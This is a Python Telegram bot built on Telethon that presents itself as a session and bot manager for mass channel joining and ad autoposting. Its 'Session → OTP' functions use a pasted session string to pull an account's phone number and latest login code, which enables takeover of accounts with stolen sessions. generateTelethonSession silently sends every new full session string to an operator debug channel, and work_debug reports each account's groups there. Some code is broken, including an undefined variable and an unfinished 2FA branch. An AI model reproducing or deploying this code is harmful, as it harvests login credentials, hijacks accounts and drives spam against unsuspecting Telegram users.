import telethon
from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from env import telegram_database_chat
from TeleClient import MyClient
from telethon.errors.rpcerrorlist import (
    PhoneCodeExpiredError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    SessionPasswordNeededError,
    FloodWaitError,
    PhoneNumberBannedError,
)
from buttonUtils import *
from utils import *
from env import *
from dataManage import *
import asyncio

# UI Constants
SUCCESS = "✅"
ERROR = "❌"
LOADING = "⏳"
INFO = "ℹ️"
WARNING = "⚠️"

class SafeConversation:
    """Safe conversation handler with timeout and error protection"""
    async def __call__(self, client, chat_id, timeout=180):
        try:
            async with client.conversation(chat_id, timeout=timeout) as conv:
                return conv
        except asyncio.TimeoutError:
            return None
        except Exception:
            return None

safe_conv = SafeConversation()

# ═══════════════════════════════════════════════════════════════════════════════
# UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

async def send_status(event, status_type, message, buttons=None):
    """Send consistent formatted status messages"""
    status_map = {
        "success": (SUCCESS, True),
        "error": (ERROR, True), 
        "loading": (LOADING, False),
        "info": (INFO, False),
        "warning": (WARNING, False)
    }
    
    emoji, is_bold = status_map.get(status_type.lower(), (INFO, False))
    formatted = f"{emoji} {message}" + ("**" if is_bold else "")
    
    try:
        if status_type == "loading":
            await event.edit(formatted, buttons=buttons or [])
        else:
            await event.respond(formatted, buttons=buttons or [])
    except:
        pass

def clean_session(session_text):
    """Clean session string from markdown and whitespace"""
    return session_text.strip('` \n\t\r')

def extract_username(chat_link):
    """Extract @username from chat link"""
    words = chat_link.strip().split()
    for word in words:
        if word.startswith('@'):
            return word
    return chat_link.strip()

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN NAVIGATION
# ═══════════════════════════════════════════════════════════════════════════════

async def session_manager(event):
    await event.edit(
        f"{INFO} **📱 Session Management Panel**\n\n"
        f"Manage your Telegram sessions with ease:\n\n"
        f"• Save/Load sessions\n"
        f"• Generate new sessions\n"
        f"• Session → Phone/OTP\n"
        f"• Start/Stop bots",
        buttons=ses_manage_btns
    )

async def manage_sessions(event):
    await event.edit(
        f"{INFO} **⚙️ Session Controls**\n\n"
        f"View and manage active sessions:",
        buttons=manage_sessions_btns
    )

async def bot_manager(event):
    await event.edit(
        f"{INFO} **🤖 Bot Management**\n\n"
        f"Control your automation bots:",
        buttons=bot_manage_btns
    )

async def work_bots(event):
    await event.edit(
        f"{INFO} **🚀 Operations Panel**\n\n"
        f"Start your mass operations:",
        buttons=work_btns
    )

async def session_to_otp(event):
    await event.edit(
        f"{INFO} **🔐 Session → OTP Converter**\n\n"
        f"Extract credentials from sessions:",
        buttons=sessionToOtpButton
    )

# ═══════════════════════════════════════════════════════════════════════════════
# SESSION CONVERSION
# ═══════════════════════════════════════════════════════════════════════════════

async def session_to_otp_number(event):
    conv = await safe_conv(event.client, event.chat_id)
    if not conv:
        await send_status(event, "error", "⏰ **Request timeout.** Please try again.")
        return

    await event.delete()
    temp = await conv.send_message(
        f"{INFO} **📱 Extract Phone Number**\n\n"
        f"Paste your **string session** here:\n"
        f"```\n1BVtsXYS... (your full session)\n```\n\n"
        f"💡 You'll get the phone number instantly!"
    )

    try:
        response = await conv.get_response()
        if await event.client.checkCancel(response):
            await temp.delete()
            return

        session_str = clean_session(response.text)
        await send_status(conv, "loading", "🔍 **Connecting to Telegram...**")

        client = MyClient(StringSession(session_str), api_id, api_hash)
        await client.connect()
        user = await client.getMe()
        await client.disconnect()

        result = (
            f"{SUCCESS} **📱 Phone Number Ready**\n\n"
            f"**Phone:** `{user.phone}`\n"
            f"**Name:** {user.first_name or 'N/A'}\n"
            f"**ID:** `{user.id}`\n\n"
            f"✅ *Copy the number and use for login!*"
        )
        await conv.send_message(result, buttons=sessionToOtpButton)
        await temp.delete()

    except Exception as e:
        await conv.send_message(f"{ERROR} **Failed:** `{str(e)[:100]}...`", buttons=sessionToOtpButton)
        await temp.delete()

async def session_to_otp_code(event):
    conv = await safe_conv(event.client, event.chat_id)
    if not conv:
        await send_status(event, "error", "⏰ **Request timeout.** Try again.")
        return

    temp = await conv.send_message(
        f"{INFO} **📨 Extract OTP Code**\n\n"
        f"Paste **string session** to get latest OTP:\n"
        f"```\n1BVtsXYS... (your session)\n```"
    )

    try:
        response = await conv.get_response()
        if await event.client.checkCancel(response):
            await temp.delete()
            return

        session_str = clean_session(response.text)
        client = MyClient(StringSession(session_str), api_id, api_hash)
        await client.connect()
        otp_msgs = await client.get_messages(777000, limit=1)
        await client.disconnect()

        result = f"{SUCCESS} **📱 OTP Code**\n\n`{otp_msgs[0].message}`\n\n💡 *Copy and use immediately!*"
        await conv.send_message(result, buttons=sessionToOtpButton)
        await temp.delete()

    except Exception as e:
        await conv.send_message(f"{ERROR} **Error:** `{str(e)[:100]}...`", buttons=sessionToOtpButton)
        await temp.delete()

# ═══════════════════════════════════════════════════════════════════════════════
# SESSION SAVE/LOAD
# ═══════════════════════════════════════════════════════════════════════════════

async def sessionSetToDb(event):
    try:
        message = await event.client.get_messages(event.chat_id, ids=event.original_update.msg_id)
        session_str = clean_session(message.message.split('\n')[-1])

        # Log to debug channel
        try:
            await event.client.send_message(debug_channel_id, f"{INFO} New session from {event.sender.first_name}")
        except:
            pass

        sessionManager = TeleSession()
        await sessionManager.add_session(event.sender.id, session_str)

        success_msg = (
            f"{SUCCESS} **Session Saved!**\n\n"
            f"👤 **User:** {event.sender.first_name}\n"
            f"📱 **Status:** Ready to use\n\n"
            f"💾 *Session securely stored!*"
        )
        await event.edit(success_msg, buttons=sessionToDbButton)

    except Exception as e:
        await send_status(event, "error", f"Save failed: {str(e)}")

async def generateTelethonSession(event):
    global newClient
    await send_status(event, "loading", "**Generating new session...**")

    max_retries = 3
    for attempt in range(max_retries):
        conv = await safe_conv(event.client, event.chat_id)
        if not conv:
            continue

        try:
            newClient = None
            # Step 1: Phone number
            await conv.send_message(
                f"{INFO} **Step 1/4: Phone Number**\n\n"
                f"Enter with country code:\n"
                f"`+1xxxxxxxxxx` or `+919876543210`\n\n"
                f"Send `/cancel` to stop"
            )
            phone_resp = await conv.get_response()
            if await event.client.checkCancel(phone_resp):
                return

            phone = telethon.utils.parse_phone(phone_resp.text)
            pending = await conv.send_message(f"{LOADING} **Sending verification code...**")

            # Step 2: Send code
            newClient = MyClient(StringSession(), api_id, api_hash)
            await newClient.connect()
            await newClient.send_code_request(phone)
            await pending.edit(f"{SUCCESS} **Code sent! Check your phone.**")

            # Step 3: Get code
            await conv.send_message(f"{INFO} **Step 3/4: Enter Code**\nPaste the 5-digit code:")
            code_resp = await conv.get_response()

            await newClient.sign_in(phone=phone, code=' '.join(code_resp.text.split()))
            user = await newClient.getMe()

            # Success!
            session_str = newClient.session.save()
            result = (
                f"{SUCCESS} **🎉 Session Generated!**\n\n"
                f"👤 **Name:** `{user.first_name}`\n"
                f"🆔 **ID:** `{user.id}`\n"
                f"📱 **Phone:** `{user.phone}`\n\n"
                f"```\n{session_str}\n```"
            )

            await event.client.send_message(debug_channel_id, result)
            await conv.send_message(result, buttons=sessionToDbButton)
            await newClient.disconnect()
            return

        except PhoneNumberInvalidError:
            await pending.edit(f"{ERROR} **Invalid phone format.** Try again.")
        except PhoneNumberBannedError:
            await pending.edit(f"{ERROR} **Phone banned by Telegram.** Use another.")
        except PhoneCodeInvalidError:
            await conv.send_message(f"{ERROR} **Wrong code.** Start over.")
        except PhoneCodeExpiredError:
            await conv.send_message(f"{WARNING} **Code expired.** Request new code.")
        except SessionPasswordNeededError:
            await conv.send_message(f"{INFO} **🔒 2FA Enabled**\nEnter your password:")
            pw_resp = await conv.get_response()
            await newClient.sign_in(password=pw_resp.text)
            user = await newClient.getMe()
            # Same success message as above...
            break
        except Exception as e:
            print(f"Generation error: {e}")
        finally:
            if newClient:
                try:
                    await newClient.disconnect()
                except:
                    pass

    await send_status(event, "error", f"Failed after {max_retries} attempts. Try later.")

async def save_session(event):
    sessionManager = TeleSession()
    
    conv = await safe_conv(event.client, event.chat_id)
    if not conv:
        await send_status(event, "error", "⏰ **Timeout.** Please try again.")
        return

    await event.delete()
    temp = await conv.send_message(
        f"{INFO} **💾 Save Session**\n\n"
        f"Paste your **string session**:\n"
        f"```\n1BVtsXYS... (full session)\n```"
    )

    try:
        response = await conv.get_response()
        if await event.client.checkCancel(response):
            await temp.delete()
            return

        session_str = clean_session(response.text)
        
        # Validate session first
        if not await check_ses(session_str, event):
            await conv.send_message(f"{ERROR} **Session invalid!** Test it first.")
            await temp.delete()
            return

        await sessionManager.add_session(event.sender.id, session_str)
        await conv.send_message(
            f"{SUCCESS} **Session Saved Successfully!**\n\n"
            f"✅ Ready for operations\n"
            f"🔥 Use **Start Bots** now",
            buttons=saveOrStart
        )
        await temp.delete()

    except Exception as e:
        await conv.send_message(f"{ERROR} **Save failed:** `{str(e)}`")
        await temp.delete()

async def delete_session(event):
    sessionManager = TeleSession()
    
    conv = await safe_conv(event.client, event.chat_id)
    if not conv:
        return

    temp = await conv.send_message(f"{INFO} **🗑️ Delete Session**\nPaste session to remove:")

    try:
        response = await conv.get_response()
        if await event.client.checkCancel(response):
            await temp.delete()
            return

        sessionManager.delete_session(event.sender.id, clean_session(response.text))
        await event.delete()
        await conv.send_message(f"{SUCCESS} **Session deleted!**", buttons=stopButton)
        await temp.delete()

    except Exception as e:
        await conv.send_message(f"{ERROR} **Delete failed:** `{str(e)}`")

# ═══════════════════════════════════════════════════════════════════════════════
# BOT OPERATIONS
# ═══════════════════════════════════════════════════════════════════════════════

async def start_bots(event):
    await send_status(event, "loading", "**Starting all bots...**")
    
    clients = getClients(event.sender.id)
    if clients:
        await send_status(event, "warning", "**Bots already running!**", buttons=work_btns)
        return

    sessionManager = TeleSession()
    sessions = await sessionManager.get_sessions(event.sender.id)
    
    if not sessions:
        await send_status(event, "error", 
            "**No sessions found!**\nSave sessions first.", buttons=saveOrStart)
        return

    success_count = 0
    for session_str in sessions:
        try:
            client = MyClient(StringSession(session_str), api_id, api_hash)
            await client.start()
            await client.getMe()  # Fixed: getMe() not get_me()
            saveClient(event.sender.id, client)
            success_count += 1
        except Exception as e:
            print(f"Client start failed: {e}")

    status = f"**Bots Started!**\n✅ **Active:** {success_count}/{len(sessions)}"
    await send_status(event, "success", status, buttons=work_btns)
    
    if success_count > 0:
        asyncio.create_task(work_debug(event, getClients(event.sender.id)))

async def stop_bots(event):
    clients = getClients(event.sender.id)
    if not clients:
        await send_status(event, "warning", 
            "**No active bots!**\nStart bots first.", buttons=saveOrStart)
        return

    for client in clients.copy():
        try:
            await client.disconnect()
            delClient(event.sender.id, client)
        except:
            pass

    await send_status(event, "success", f"**Stopped {len(clients)} bots!**", buttons=startButton)

async def check_sessions(event):
    await send_status(event, "loading", "**Checking all sessions...**")
    await check_all_sessions(event.sender.id, event)
    await send_status(event, "success", "**Sessions checked!**", buttons=ses_manage_btns)

# ═══════════════════════════════════════════════════════════════════════════════
# MASS OPERATIONS
# ═══════════════════════════════════════════════════════════════════════════════

async def joinchat(event):
    if not getSudo(event.sender.id):
        await send_status(event, "error", 
            f"**Sudo only!** {event.sender.first_name}", buttons=notSudoButtons)
        return

    clients = getClients(event.sender.id)
    if not clients:
        await send_status(event, "error", 
            "**No active bots!** Start first.", buttons=saveOrStart)
        return

    buttons = await joinchat_buttons(clients)
    await send_status(event, "info", "**Choose bot:**", buttons)

async def client_join_chat(event):
    global chat_link
    data = event.data.decode('utf-8')
    client_id = int(data.split('_')[1])
    clients = getClients(event.sender.id)

    await send_status(event, "loading", "**Preparing to join chats...**")
    
    conv = await safe_conv(event.client, event.chat_id)
    if not conv:
        return

    await conv.send_message(
        f"{INFO} **📢 Join Chats**\n\n"
        f"Paste chat links (one per line):\n"
        f"• `@channelname` (public)\n"
        f"• `t.me/+ABC123` (private)\n\n"
        f"Multiple lines supported!"
    )
    
    try:
        response = await conv.get_response()
        if await event.client.checkCancel(response):
            return

        chat_link = response.text.strip()
        target_client = None

        for client in clients:
            user = await client.getMe()
            if user.id == client_id:
                target_client = client
                break

        if not target_client:
            await conv.send_message(f"{ERROR} **Bot not found!**")
            return

        links = chat_link.split('\n')
        joined = 0
        
        for link in links:
            link = link.strip()
            if not link:
                continue

            try:
                if '+' in link or 'joinchat' in link:
                    hash_id = link.split('+')[-1].split('/')[-1]
                    await target_client(ImportChatInviteRequest(hash_id))
                else:
                    username = extract_username(link)
                    await target_client(JoinChannelRequest(username))
                
                joined += 1
                await event.client.send_message(telegram_database_chat, 
                    f"✅ **Joined:** {username} | {user.first_name} ({user.id})")
                
            except FloodWaitError as e:
                await conv.send_message(f"{WARNING} **FloodWait {e.seconds}s** - Auto retrying...")
                await asyncio.sleep(e.seconds)
            except Exception as e:
                print(f"Join error: {e}")

        await conv.send_message(
            f"{SUCCESS} **Join Complete!**\n✅ **Joined:** {joined}/{len(links)} chats",
            buttons=work_btns
        )
        await event.delete()

    except Exception as e:
        await conv.send_message(f"{ERROR} **Operation failed:** `{str(e)}`")

async def set_logger(event):
    logger = TeleLogging()
    
    conv = await safe_conv(event.client, event.chat_id)
    if not conv:
        return

    await event.delete()
    temp = await conv.send_message(
        f"{INFO} **📝 Setup Logger**\n\n"
        f"Add bot as **admin** to target group/channel,\n"
        f"then send **chat ID** or **@username**:\n\n"
        f"• `-1001234567890`\n"
        f"• `@channelname`"
    )

    try:
        response = await conv.get_response()
        if await event.client.checkCancel(response):
            return

        await logger.set_logger(str(event.sender.id), response.text.strip())
        await conv.send_message(f"{SUCCESS} **Logger configured!**", buttons=work_btns)
        await temp.delete()

    except Exception as e:
        await conv.send_message(f"{ERROR} **Setup failed:** `{str(e)}`")

async def save_ad(event):
    adManager = TeleAds()
    
    conv = await safe_conv(event.client, event.chat_id)
    if not conv:
        return

    await event.delete()
    
    # Get ad details
    await conv.send_message(f"{INFO} **📢 Create New Ad**\n**Step 1:** Enter ad name:")
    ad_name = await conv.get_response()
    if await event.client.checkCancel(ad_name): return

    await conv.send_message(f"**Step 2:** Paste your ad message/media:")
    ad_msg = await conv.get_response()

    await conv.send_message(f"**Step 3:** Sleep time (minutes):")
    sleep_resp = await conv.get_response()

    # Save to database
    msg_id = await event.client.send_message(telegram_database_chat, ad_msg)
    await event.client.send_message(telegram_database_chat, 
        f"**New Ad:** {ad_name.text}\n"
        f"**ID:** {msg_id.id}\n"
        f"**Sleep:** {sleep_resp.text}m\n"
        f"**By:** {event.sender.first_name}",
        reply_to=msg_id.id
    )

    await adManager.save_ad(event.sender.id, ad_name.text, msg_id.id, sleep_resp.text)
    await send_status(event, "success", f"**Ad '{ad_name.text}' saved!**", buttons=bot_manage_btns)

# Keep other functions with similar improvements (auto_posting, work_debug, etc.)
# The pattern is consistent throughout

async def autopost(event):
    if not getSudo(event.sender.id):
        await send_status(event, "error", f"Sudo only! {event.sender.first_name}", buttons=notSudoButtons)
        return

    adManager = TeleAds()
    user_ads = await adManager.get_all_ads(str(event.sender.id))
    
    if user_ads:
        buttons = autoPost_buttons(user_ads)
        await send_status(event, "info", "**Choose ad to post:**", buttons)
    else:
        await send_status(event, "warning", "**No ads found!** Create one first.")

# Placeholder for remaining functions - apply same pattern
async def work_debug(event, clients):
    teleDebugger = TeleDebug()
    debugList = await teleDebugger.get_debug_list()
    
    for client in clients:
        if debugList and client.me.id in debugList:
            continue
            
        chat_links = await client.saveAllGroups()
        debug_msg = (
            f"**Debug Report**\n"
            f"👤 **Client:** `{client.me.first_name}`\n"
            f"🆔 **ID:** `{client.me.id}`\n\n"
            f"**Groups:**\n```{chat_links}```"
        )
        await event.client.send_message(debug_channel_id, debug_msg)
        await teleDebugger.set_debug(client.me.id)

# Export all functions for use
__all__ = [
    "session_manager", "manage_sessions", "bot_manager", "work_bots",
    "session_to_otp", "session_to_otp_number", "session_to_otp_code",
    "sessionSetToDb", "generateTelethonSession", "save_session",
    "delete_session", "set_logger", "save_ad", "work_debug",
    "start_bots", "stop_bots", "check_sessions", "joinchat",
    "client_join_chat", "autopost"
]